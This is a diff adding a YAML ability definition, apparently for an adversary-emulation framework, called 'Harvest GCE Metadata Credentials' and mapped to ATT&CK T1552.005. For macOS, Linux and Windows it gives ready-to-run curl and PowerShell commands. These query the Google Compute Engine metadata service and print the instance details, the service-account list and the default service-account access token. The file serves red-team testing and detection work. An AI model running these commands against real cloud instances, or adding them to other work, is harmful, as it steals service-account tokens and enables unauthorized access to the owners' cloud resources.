@@ -1,0 +1,74 @@
+---
+- id: gcp-cred-002
+  name: Harvest GCE Metadata Credentials
+  description: Extract GCP credentials from Compute Engine metadata service
+  tactic: credential-access
+  technique:
+    attack_id: T1552.005
+    name: Cloud Instance Metadata API
+  platforms:
+    darwin:
+      sh:
+        command: |
+          echo "[+] Attempting to access GCE instance metadata:"
+          # Check if running on GCE
+          curl -s -H "Metadata-Flavor: Google" -m 2 --connect-timeout 2 "http://metadata.google.internal/computeMetadata/v1/" 2>/dev/null
+          if [ $? -eq 0 ]; then
+            echo "[+] GCE metadata service accessible"
+            echo "[+] Instance info:"
+            curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true" 2>/dev/null | head -20
+            echo "[+] Service accounts:"
+            curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" 2>/dev/null
+            echo "[+] Default service account token:"
+            curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null
+            echo "[+] Default service account info:"
+            curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/?recursive=true" 2>/dev/null
+          else
+            echo "[-] Not running on GCE instance or no metadata access"
+          fi
+    linux:
+      sh:
+        command: |
+          echo "[+] Attempting to access GCE instance metadata:"
+          # Check if running on GCE
+          curl -s -H "Metadata-Flavor: Google" -m 2 --connect-timeout 2 "http://metadata.google.internal/computeMetadata/v1/" 2>/dev/null
+          if [ $? -eq 0 ]; then
+            echo "[+] GCE metadata service accessible"
+            echo "[+] Instance info:"
+            curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true" 2>/dev/null | head -20
+            echo "[+] Service accounts:"
+            curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" 2>/dev/null
+            echo "[+] Default service account token:"
+            curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null
+            echo "[+] Default service account info:"
+            curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/?recursive=true" 2>/dev/null
+          else
+            echo "[-] Not running on GCE instance or no metadata access"
+          fi
+    windows:
+      psh,pwsh:
+        command: |
+          try {
+            Write-Host "[+] Attempting to access GCE instance metadata:"
+            $headers = @{"Metadata-Flavor" = "Google"}
+            $response = Invoke-RestMethod -Uri "http://metadata.google.internal/computeMetadata/v1/" -Headers $headers -TimeoutSec 2 -ErrorAction Stop
+            
+            Write-Host "[+] GCE metadata service accessible"
+            Write-Host "[+] Instance info:"
+            $instanceInfo = Invoke-RestMethod -Uri "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true" -Headers $headers -TimeoutSec 5
+            $instanceInfo | ConvertTo-Json -Depth 2 | Select-Object -First 20
+            
+            Write-Host "[+] Service accounts:"
+            $serviceAccounts = Invoke-RestMethod -Uri "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" -Headers $headers -TimeoutSec 2
+            Write-Host $serviceAccounts
+            
+            Write-Host "[+] Default service account token:"
+            $token = Invoke-RestMethod -Uri "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -Headers $headers -TimeoutSec 2
+            $token | ConvertTo-Json
+            
+            Write-Host "[+] Default service account info:"
+            $saInfo = Invoke-RestMethod -Uri "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/?recursive=true" -Headers $headers -TimeoutSec 2
+            $saInfo | ConvertTo-Json
+          } catch {
+            Write-Host "[-] Not running on GCE instance or no metadata access: $($_.Exception.Message)"
+          }
